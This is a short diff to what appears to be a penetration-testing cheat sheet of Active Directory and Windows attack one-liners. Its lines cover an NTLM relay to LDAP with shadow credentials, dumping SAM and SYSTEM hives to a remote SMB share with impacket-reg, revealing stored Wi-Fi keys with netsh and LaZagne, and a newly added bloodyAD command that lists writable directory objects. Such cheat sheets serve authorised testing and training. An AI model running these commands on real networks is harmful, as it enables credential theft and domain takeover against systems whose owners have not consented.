@@ -33,7 +33,7 @@ impacket-ntlmrelayx -t ldap://192.168.1.14 --shadow-credentials --shadow-target 
 impacket-reg ignite.local/aarav:Password@1@192.168.1.48 backup -o '\\192.168.1.16\share' 	#  dump the SAM and SYSTEM hives from the target machine, using the impacket-reg tool
 netsh wlan show profile name=<SSID Name> key=clear	# know the passwords of any one of the mencioned SSIDs
 lazagne.exe wifi	# retrieve all the passwords stored in your machine WIFI
-
+bloodyAD --host 10.10.10.10 -d attack.lab -u john.doe -p 'Password123*' get writable --detail	# Show all the writable of user
 
 # RUBEUS
 
